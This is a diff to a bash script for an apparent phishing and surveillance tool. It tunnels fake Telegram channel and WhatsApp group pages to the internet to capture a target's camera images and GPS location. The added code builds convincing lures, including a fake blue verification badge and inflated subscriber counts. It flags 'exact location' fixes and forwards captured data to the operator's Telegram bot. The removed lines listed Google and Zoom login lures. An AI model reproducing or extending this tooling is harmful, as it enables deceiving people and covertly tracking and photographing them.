@@ -13,8 +13,10 @@ pkill -f cloudflared 2>/dev/null
 killall cloudflared 2>/dev/null
 pkill -f loophole 2>/dev/null
 killall loophole 2>/dev/null
-rm -f ip.txt current_location.txt LocationLog.log Log.log 2>/dev/null
+rm -f ip.txt current_location.txt LocationLog.log Log.log custom_image.jpg 2>/dev/null
 sed -i "s|\$baseDir = 'user_info.*';|\$baseDir = 'user_info';|g" server.php 2>/dev/null
+sed -i "s|\$telegram_bot_token = '.*';|\$telegram_bot_token = '';|g" server.php 2>/dev/null
+sed -i "s|\$telegram_chat_id = '.*';|\$telegram_chat_id = '';|g" server.php 2>/dev/null
 printf "\e[1;92m[✓] All processes stopped.\e[0m\n"
 exit 0
 }
@@ -45,28 +47,40 @@ printf "\n"
 dependencies() {
 command -v php > /dev/null 2>&1 || { printf "\e[1;31m[!] PHP is not installed. Install it with: sudo apt install php\e[0m\n"; exit 1; }
 command -v wget > /dev/null 2>&1 || { printf "\e[1;31m[!] wget is not installed. Install it with: sudo apt install wget\e[0m\n"; exit 1; }
+command -v curl > /dev/null 2>&1 || { printf "\e[1;31m[!] curl is not installed. Install it with: sudo apt install curl\e[0m\n"; exit 1; }
 command -v unzip > /dev/null 2>&1 || { printf "\e[1;31m[!] unzip is not installed. Install it with: sudo apt install unzip\e[0m\n"; exit 1; }
 }
 
 catch_location() {
-if [[ -e "user_info/$target_user/current_location.txt" ]]; then
-    mv "user_info/$target_user/current_location.txt" "user_info/$target_user/current_location.bak"
-fi
+    if [[ -e "user_info/$target_user/current_location.txt" ]]; then
+        mv "user_info/$target_user/current_location.txt" "user_info/$target_user/current_location.bak"
+    fi
 
-if ls "user_info/$target_user"/location_* 1> /dev/null 2>&1; then
-    location_file=$(ls "user_info/$target_user"/location_* | head -n 1)
-    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
-    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
-    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
-    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
-    
-    printf "\n\e[1;92m[\e[0m+\e[1;92m] Location: \e[0m\e[1;77m%s, %s\e[0m (\e[1;93m±%s m\e[0m)\n" "$lat" "$lon" "$acc"
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Map:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"
-    
-    mkdir -p "user_info/$target_user/saved_locations"
-    mv "$location_file" "user_info/$target_user/saved_locations/"
-    printf "\e[1;94m[\e[0m\e[1;77m*\e[0m\e[1;94m] Saved: user_info/$target_user/saved_locations/%s\e[0m\n" "$(basename "$location_file")"
-fi
+    # Enable nullglob to handle case where no files exist
+    shopt -s nullglob
+    for location_file in "user_info/$target_user"/location_*; do
+        lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
+        lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
+        acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
+        maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
+        
+        # Convert accuracy to integer (remove decimals)
+        acc_int=${acc%.*}
+        
+        if [[ "$acc_int" -le 30 ]]; then
+            printf "\n\e[1;92m[✓] \e[1;93mEXACT LOCATION FOUND!\e[0m\n"
+            printf "\e[1;92m[✓] Location: \e[0m\e[1;77m%s, %s\e[0m (\e[1;92m±%s m\e[0m)\n" "$lat" "$lon" "$acc"
+        else
+             printf "\n\e[1;92m[\e[0m+\e[1;92m] Location: \e[0m\e[1;77m%s, %s\e[0m (\e[1;93m±%s m\e[0m)\n" "$lat" "$lon" "$acc"
+        fi
+        
+        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Map:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"
+        
+        mkdir -p "user_info/$target_user/saved_locations"
+        mv "$location_file" "user_info/$target_user/saved_locations/"
+        printf "\e[1;94m[\e[0m\e[1;77m*\e[0m\e[1;94m] Saved: user_info/$target_user/saved_locations/%s\e[0m\n" "$(basename "$location_file")"
+    done
+    shopt -u nullglob
 }
 
 checkfound() {
@@ -133,6 +147,97 @@ while [ true ]; do
 done 
 }
 
+select_mode() {
+    printf "\n-----Choose Capture Mode----\n"
+    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Camera Only\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Location Only\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Both (Camera + Location)\e[0m\n"
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a mode: [Default is 3] \e[0m' option_mode
+    option_mode="${option_mode:-3}"
+    case $option_mode in
+        1) use_cam="true"; use_loc="false" ;;
+        2) use_cam="false"; use_loc="true" ;;
+        3) use_cam="true"; use_loc="true" ;;
+        *) use_cam="true"; use_loc="true" ;;
+    esac
+}
+
+customize_template() {
+    def_default_img=""
+    def_default_title="Meeting Invite"
+    def_default_desc="Join the meeting"
+    def_default_subs=""
+    def_default_tag=""
+
+    def_tg_img="tg_files/tg_default.jpg"
+    def_tg_title="Telegram Channel"
+    def_tg_desc="Join this Telegram Channel."
+    def_tg_subs="10 000"
+    def_tg_tag="channel"
+    
+    custom_img="$def_default_img"
+    custom_title="$def_default_title"
+    custom_desc="$def_default_desc"
+    custom_members="$def_default_subs"
+    custom_tag="$def_default_tag"
+
+    case $option_tem in
+        1) custom_title="$def_tg_title"; custom_desc="$def_tg_desc"; custom_img="$def_tg_img"; custom_members="$def_tg_subs"; custom_tag="$def_tg_tag" ;;
+        2) custom_title="Online Shopping"; custom_img="https://pps.whatsapp.net/v/t61.24694-24/586499402_1548915952952220_7451154550492412225_n.jpg?ccb=11-4&oh=01_Q5Aa3QHtDVyHF-BA7NsFMht-gKEJboQCvqwqdT31LSkNsAKlDg&oe=69513CDA&_nc_sid=5e03e0&_nc_cat=100" ;;
+    esac
+
+    # Always customize
+    if [[ "$option_tem" == "1" ]]; then # Telegram
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Channel Name (Default: Telegram Channel): \e[0m' in_title
+         [[ -n "$in_title" ]] && custom_title="$in_title"
+         
+         # Verification Badge Option
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Add Blue Verification Mark? (y/N): \e[0m' in_verify
+         if [[ "$in_verify" == "y" || "$in_verify" == "Y" ]]; then
+             custom_verified='<i class="verified-icon"> ✔</i>'
+         else
+             custom_verified=''
+         fi
+
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Subscribers (Default: 10000): \e[0m' in_subs
+         if [[ -n "$in_subs" ]]; then
+             # Remove existing spaces or commas to be safe
+             clean_subs=$(echo "$in_subs" | tr -d ' ,')
+             if [[ "$clean_subs" =~ ^[0-9]+$ ]]; then
+                 # Format with commas
+                 custom_members=$(printf "%'.f" "$clean_subs")
+             else
+                 custom_members="$in_subs"
+             fi
+         fi
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Channel Tag (without @, Default: channel): \e[0m' in_tag
+         [[ -n "$in_tag" ]] && custom_tag="$in_tag"
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Image URL or Local Path: \e[0m' in_img
+         if [[ -n "$in_img" ]]; then
+             if [[ -f "$in_img" ]]; then
+                 cp "$in_img" "custom_image.jpg"
+                 custom_img="custom_image.jpg"
+             else
+                 custom_img="$in_img"
+             fi
+         fi
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Description: \e[0m' in_desc
+         [[ -n "$in_desc" ]] && custom_desc="$in_desc"
+    elif [[ "$option_tem" == "2" ]]; then # WhatsApp
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Group Name (Default: Online Shopping): \e[0m' in_title
+         [[ -n "$in_title" ]] && custom_title="$in_title"
+         read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Image URL or Local Path: \e[0m' in_img
+         if [[ -n "$in_img" ]]; then
+             if [[ -f "$in_img" ]]; then
+                 cp "$in_img" "custom_image.jpg"
+                 custom_img="custom_image.jpg"
+             else
+                 custom_img="$in_img"
+             fi
+         fi
+    fi
+}
+
 
 cloudflare_tunnel() {
 if [[ ! -e cloudflared ]]; then
@@ -167,16 +272,24 @@ checkfound
 }
 
 payload_cloudflare() {
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
-sed "s+forwarding_link+$link+g" capture.js > capture_live.js
-case $option_tem in
-    1) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/OnlineMeeting.html > index2.html ;;
-    2) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/TelegramPremium.html > index2.html ;;
-    3) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/PornSite.html > index2.html ;;
-    4) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/WhatsAppGroup.html > index2.html ;;
-    5) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/GoogleLogin.html > index2.html ;;
-    6) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/ZoomLogin.html > index2.html ;;
-esac
+    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+    sed "s+forwarding_link+$link+g" capture.js > capture_live.js
+    
+    # Escape pipe for sed
+    safe_title=$(echo "$custom_title" | sed 's/|/\\|/g')
+    safe_img=$(echo "$custom_img" | sed 's/|/\\|/g')
+    safe_desc=$(echo "$custom_desc" | sed 's/|/\\|/g')
+    safe_members=$(echo "$custom_members" | sed 's/|/\\|/g')
+    safe_tag=$(echo "$custom_tag" | sed 's/|/\\|/g')
+    # No need to escape complex HTML for verified badge as it is controlled string
+    safe_verified="$custom_verified"
+
+    SED_CMD="s|forwarding_link|$link|g; s|option_loc|$use_loc|g; s|option_cam|$use_cam|g; s|capture.js|capture_live.js|g; s|__TITLE__|$safe_title|g; s|__IMG__|$safe_img|g; s|__DESC__|$safe_desc|g; s|__MEMBERS__|$safe_members|g; s|__TAG__|$safe_tag|g; s|__VERIFIED__|$safe_verified|g"
+
+    case $option_tem in
+        1) sed "$SED_CMD" templates/TelegramChannel.html > index2.html ;;
+        2) sed "$SED_CMD" templates/WhatsAppGroup.html > index2.html ;;
+    esac
 }
 
 
@@ -235,16 +348,24 @@ checkfound
 
 
 payload_loophole() {
-link=$(grep -o 'https://[a-zA-Z0-9-]*\.loophole\.site' .loophole.log | head -1)
-sed "s+forwarding_link+$link+g" capture.js > capture_live.js
-case $option_tem in
-    1) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/OnlineMeeting.html > index2.html ;;
-    2) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/TelegramPremium.html > index2.html ;;
-    3) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/PornSite.html > index2.html ;;
-    4) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/WhatsAppGroup.html > index2.html ;;
-    5) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/GoogleLogin.html > index2.html ;;
-    6) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/ZoomLogin.html > index2.html ;;
-esac
+    link=$(grep -o 'https://[a-zA-Z0-9-]*\.loophole\.site' .loophole.log | head -1)
+    sed "s+forwarding_link+$link+g" capture.js > capture_live.js
+
+    # Escape pipe for sed
+    safe_title=$(echo "$custom_title" | sed 's/|/\\|/g')
+    safe_img=$(echo "$custom_img" | sed 's/|/\\|/g')
+    safe_desc=$(echo "$custom_desc" | sed 's/|/\\|/g')
+    safe_members=$(echo "$custom_members" | sed 's/|/\\|/g')
+    safe_tag=$(echo "$custom_tag" | sed 's/|/\\|/g')
+    # No need to escape complex HTML for verified badge as it is controlled string
+    safe_verified="$custom_verified"
+
+    SED_CMD="s|forwarding_link|$link|g; s|option_loc|$use_loc|g; s|option_cam|$use_cam|g; s|capture.js|capture_live.js|g; s|__TITLE__|$safe_title|g; s|__IMG__|$safe_img|g; s|__DESC__|$safe_desc|g; s|__MEMBERS__|$safe_members|g; s|__TAG__|$safe_tag|g; s|__VERIFIED__|$safe_verified|g"
+
+    case $option_tem in
+        1) sed "$SED_CMD" templates/TelegramChannel.html > index2.html ;;
+        2) sed "$SED_CMD" templates/WhatsAppGroup.html > index2.html ;;
+    esac
 }
 
 
@@ -257,21 +378,13 @@ esac
 
 select_template() {
 printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting (Zoom)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Telegram Premium\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Porn Site (FUQ)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp Group\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Google Login\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Zoom Login\e[0m\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Telegram Channel\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp Group\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-1}"
 case $option_tem in
-    1) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Online Meeting template\e[0m\n" ;;
-    2) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Telegram Premium template\e[0m\n" ;;
-    3) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Porn Site template\e[0m\n" ;;
-    4) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using WhatsApp Group template\e[0m\n" ;;
-    5) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Google Login template\e[0m\n" ;;
-    6) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Zoom Login template\e[0m\n" ;;
+    1) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Telegram Channel template\e[0m\n" ;;
+    2) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using WhatsApp Group template\e[0m\n" ;;
     *) printf "\e[1;93m [!] Invalid option!\e[0m\n"; select_template ;;
 esac
 }
@@ -290,7 +403,37 @@ target_user=$(echo "$target_user" | tr -cd '[:alnum:]_-')
 [[ -z "$target_user" ]] && target_user="target"
 mkdir -p "user_info/$target_user"
 
+mkdir -p "user_info/$target_user"
+
 sed -i "s|\$baseDir = 'user_info.*';|\$baseDir = 'user_info/$target_user';|g" server.php
+
+# Telegram Notification Setup
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enable Telegram Notifications? (y/N): \e[0m' use_tg
+if [[ "$use_tg" == "y" || "$use_tg" == "Y" ]]; then
+    read -p $'\e[1;93m[\e[0m*\e[1;93m] Enter Telegram Bot Token: \e[0m' tg_token
+    
+    printf "\n\e[1;93m[\e[0m!\e[1;93m] Please send any message (e.g., /start) to your bot on Telegram now.\e[0m\n"
+    printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for chat ID... \e[0m"
+    
+    while true; do
+        # Use wget to fetch updates, suppress output, send to stdout
+        updates=$(wget -qO- --no-check-certificate "https://api.telegram.org/bot$tg_token/getUpdates")
+        
+        # Use PHP to parse JSON reliably (finds ID from message, edited_message, or channel_post)
+        id_chk=$(echo "$updates" | php -r '$d=json_decode(file_get_contents("php://stdin"),true); if(!empty($d["result"])) { $last=end($d["result"]); echo $last["message"]["chat"]["id"] ?? $last["edited_message"]["chat"]["id"] ?? $last["channel_post"]["chat"]["id"] ?? ""; }')
+        
+        if [[ -n "$id_chk" ]]; then
+            tg_id=$id_chk
+            printf "\e[1;92m Found! ID: $tg_id\e[0m\n"
+            break
+        fi
+        sleep 2
+    done
+
+    # Update server.php
+    sed -i "s|\$telegram_bot_token = '';|\$telegram_bot_token = '$tg_token';|g" server.php
+    sed -i "s|\$telegram_chat_id = '';|\$telegram_chat_id = '$tg_id';|g" server.php
+fi
 
 printf "\n-----Choose tunnel server----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
@@ -299,6 +442,8 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding optio
 option_server="${option_server:-1}"
 
 select_template
+select_mode
+customize_template
 
 case $option_server in
     1) cloudflare_tunnel ;;
